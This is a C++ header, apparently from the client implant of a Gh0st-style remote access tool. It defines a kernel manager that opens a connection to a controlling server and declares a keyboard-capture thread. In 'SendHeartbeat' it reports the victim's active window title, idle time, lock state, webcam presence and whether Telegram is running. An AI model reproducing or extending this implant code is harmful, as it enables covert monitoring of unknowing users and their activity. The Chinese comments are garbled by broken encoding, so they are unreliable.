// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
#define AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include <vector>

#define MAX_THREADNUM 0x1000>>2

#include <iostream>
#include <string>
#include <iomanip>
#include <TlHelp32.h>
#include "LoginServer.h"

// �������þ�������ʲôͨѶЭ��
IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect = false);

ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP);

class ActivityWindow {
public:
	std::string Check(DWORD threshold_ms = 6000) {
		auto idle = GetUserIdleTime();
		BOOL isActive = (idle < threshold_ms);
		if (isActive) {
			return GetActiveWindowTitle();
		}
		return (!IsWorkstationLocked() ? "Inactive: " : "Locked: ") + FormatMilliseconds(idle);
	}

private:
	std::string FormatMilliseconds(DWORD ms)
	{
		DWORD totalSeconds = ms / 1000;
		DWORD hours = totalSeconds / 3600;
		DWORD minutes = (totalSeconds % 3600) / 60;
		DWORD seconds = totalSeconds % 60;

		std::stringstream ss;
		ss << std::setfill('0')
			<< std::setw(2) << hours << ":"
			<< std::setw(2) << minutes << ":"
			<< std::setw(2) << seconds;

		return ss.str();
	}

	std::string GetActiveWindowTitle()
	{
		HWND hForegroundWindow = GetForegroundWindow();
		if (hForegroundWindow == NULL)
			return "No active window";

		char windowTitle[256];
		GetWindowTextA(hForegroundWindow, windowTitle, sizeof(windowTitle));
		return std::string(windowTitle);
	}

	DWORD GetLastInputTime()
	{
		LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
		GetLastInputInfo(&lii);
		return lii.dwTime;
	}

	DWORD GetUserIdleTime()
	{
		return (GetTickCount64() - GetLastInputTime());
	}

	bool IsWorkstationLocked() {
		HDESK hInput = OpenInputDesktop(0, FALSE, GENERIC_READ);
		// ����޷������棬��������Ϊ�����Ѿ��л��� Winlogon
		if (!hInput) return true;
		char name[256] = {0};
		DWORD needed;
		bool isLocked = false;
		if (GetUserObjectInformationA(hInput, UOI_NAME, name, sizeof(name), &needed)) {
			isLocked = (_stricmp(name, "Winlogon") == 0);
		}
		CloseDesktop(hInput);
		return isLocked;
	}
};

struct RttEstimator {
	double srtt = 0.0;       // ƽ�� RTT (��)
	double rttvar = 0.0;     // RTT ���� (��)
	double rto = 0.0;        // ��ʱʱ�� (��)
	bool initialized = false;

	void update_from_sample(double rtt_ms) {
		const double alpha = 1.0 / 8;
		const double beta = 1.0 / 4;

		// ת������
		double rtt = rtt_ms / 1000.0;

		if (!initialized) {
			srtt = rtt;
			rttvar = rtt / 2.0;
			rto = srtt + 4.0 * rttvar;
			initialized = true;
		}
		else {
			rttvar = (1.0 - beta) * rttvar + beta * std::fabs(srtt - rtt);
			srtt = (1.0 - alpha) * srtt + alpha * rtt;
			rto = srtt + 4.0 * rttvar;
		}

		// ������С RTO��RFC 6298 �Ƽ� 1 �룩
		if (rto < 1.0) rto = 1.0;
	}
};

class CKernelManager : public CManager  
{
public:
	CONNECT_ADDRESS* m_conn;
	HINSTANCE m_hInstance;
	CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s);
	virtual ~CKernelManager();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
	ThreadInfo* m_hKeyboard;
	ThreadInfo  m_hThread[MAX_THREADNUM];
	// ��ֵ��ԭ�����������ڼ�¼�߳����������߳�������������ʱm_hThread��Խ������³����쳣
	// ����ҽ���ֵ�ĺ����޸�Ϊ"�����߳��±�"����������m_hThread����ָλ�ÿ��ã��������µ��̷߳����ڸ�λ��
	ULONG   m_ulThreadCount;
	UINT	GetAvailableIndex();
	State& g_bExit; // Hide base class variable
	MasterSettings m_settings;
	RttEstimator m_nNetPing; // ����״��
	// ��������
	int SendHeartbeat() {
		for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
			Sleep(1000);
		if (m_settings.ReportInterval <= 0) { // �ر��ϱ���Ϣ����������
			for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected()&& m_settings.ReportInterval <= 0; --i)
				Sleep(1000);
			return 0;
		}
		if (g_bExit || !m_ClientObject->IsConnected())
			return -1;

		ActivityWindow checker;
		auto s = checker.Check();
		Heartbeat a(s, m_nNetPing.srtt);

		a.HasSoftware = SoftwareCheck(m_settings.DetectSoftware);

		BYTE buf[sizeof(Heartbeat) + 1];
		buf[0] = TOKEN_HEARTBEAT;
		memcpy(buf + 1, &a, sizeof(Heartbeat));
		m_ClientObject->Send2Server((char*)buf, sizeof(buf));
		return 0;
	}
	bool SoftwareCheck(int type) {
		static std::map<int, std::string> m = {
			{SOFTWARE_CAMERA, "����ͷ"},
			{SOFTWARE_TELEGRAM, "telegram.exe" },
		};
		static bool hasCamera = WebCamIsExist();
		return type == SOFTWARE_CAMERA ? hasCamera : IsProcessRunning({ m[type] });
	}
	// �������Ƿ���������
	bool IsProcessRunning(const std::vector<std::string>& processNames) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		// ��ȡ��ǰϵͳ�����н��̵Ŀ���
		HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
			return true;

		// �������н���
		if (Process32First(hProcessSnap, &pe32)) {
			do {
				for (const auto& processName : processNames) {
					// �����������ƥ�䣬�򷵻� true
					if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
						CloseHandle(hProcessSnap);
						return true;
					}
				}
			} while (Process32Next(hProcessSnap, &pe32));
		}

		CloseHandle(hProcessSnap);
		return false;
	}
};

#endif // !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
